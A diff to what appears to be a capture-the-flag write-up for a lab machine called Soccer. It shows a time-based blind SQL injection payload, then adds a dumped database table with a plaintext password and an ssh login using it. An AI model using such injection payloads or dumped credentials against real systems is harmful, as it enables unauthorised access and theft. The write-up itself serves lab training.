@@ -401,7 +401,18 @@ Parameter: id (GET)
     Payload: id=1 AND (SELECT 7135 FROM (SELECT(SLEEP(5)))AeFX)
 ```
 
-PlayerOftheMatch2022
+After a long time we finally get the username and password and can login through ssh!
+
+```console
+Database: soccer_db
+Table: accounts
+[1 entry]
++------+----------------------+----------------------+----------+
+| id   | email                | password             | username |
++------+----------------------+----------------------+----------+
+| 1324 | player@pla\x9der.htb | PlayerOftheMatch2022 | player   |
++------+----------------------+----------------------+----------+
+```
 
 ```console
 └─$ ssh player@soccer.htb              
